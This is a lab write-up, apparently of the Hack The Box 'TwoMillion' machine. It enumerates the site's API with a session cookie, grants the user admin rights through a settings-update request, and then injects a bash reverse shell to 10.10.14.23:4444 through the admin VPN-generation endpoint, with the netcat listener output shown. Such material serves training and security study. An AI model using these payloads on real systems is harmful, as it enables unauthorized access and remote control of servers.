# Port 80 - Authenticated Enumeration

* User created using generated invite token:

```bash
username: testuser1
email: testuser1@email.com
password: password
```

* Visited signed in landing page: [signed_in_landing_page.html](landing_page_signed_in.html)
* Found api endpoints for getting vpn access: `api/v1/user/vpn/generate`


```bash
curl 'http://2million.htb/api/v1/user/vpn/generate' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' \
  --insecure
```

* test more endpoints with authenticated session

```bash
curl 'http://2million.htb/api/v1' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' \
  --insecure
```

```bash
➜  ~ curl 'http://2million.htb/api/v1' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' \
  --insecure
{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}%
```

Test admin endpoints:

```bash
➜  ~ curl 'http://2million.htb/api/v1/admin/auth' \
  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta'

{"message":false}%
```

```
➜  ~ curl -X PUT 'http://2million.htb/api/v1/admin/settings/update' \
  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta' \
  -H 'Content-Type: application/json' \
  -d '{"email": "testuser1@email.com", "is_admin": 1}'

{"id":14,"username":"testuser1","is_admin":1}%
➜  ~ curl 'http://2million.htb/api/v1/admin/auth' \
  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta'

{"message":true}%
```

Tested generating VPN for specific users: testuser and testuser1. See [vpn_generation](test_generate_vpn.txt)

```bash
# Basic VPN gen for another user
curl -X POST 'http://2million.htb/api/v1/admin/vpn/generate' \
  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta' \
  -H 'Content-Type: application/json' \
  -d '{"username": "testuser1"}'
```

Test command injection in the admin endpoint: see [command_injection](test_command_injection.txt)

Command injection is confirmed. Tested with `whoami`. Testing rev shell:

```bash
curl -X POST 'http://2million.htb/api/v1/admin/vpn/generate' \
  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta' \
  -H 'Content-Type: application/json' \
  -d '{"username": "$(bash -c \"bash -i >& /dev/tcp/10.10.14.23/4444 0>&1\")"}'
```

Got reverse shell. 

```bash
└─$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.229.66 45462
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ which python3
which python3
/usr/bin/python3
www-data@2million:~/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@2million:~/html$ ^Z
[1]+  Stopped                    nc -lnvp 4444

┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/boxes/active/TwoMillion]
└─$ stty raw -echo

┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/boxes/active/TwoMillion]
└─$
nc -lnvp 4444

www-data@2million:~/html$
www-data@2million:~/html$ ls
Database.php  VPN     controllers  fonts   index.php  views
Router.php    assets  css          images  js
www-data@2million:~/html$
```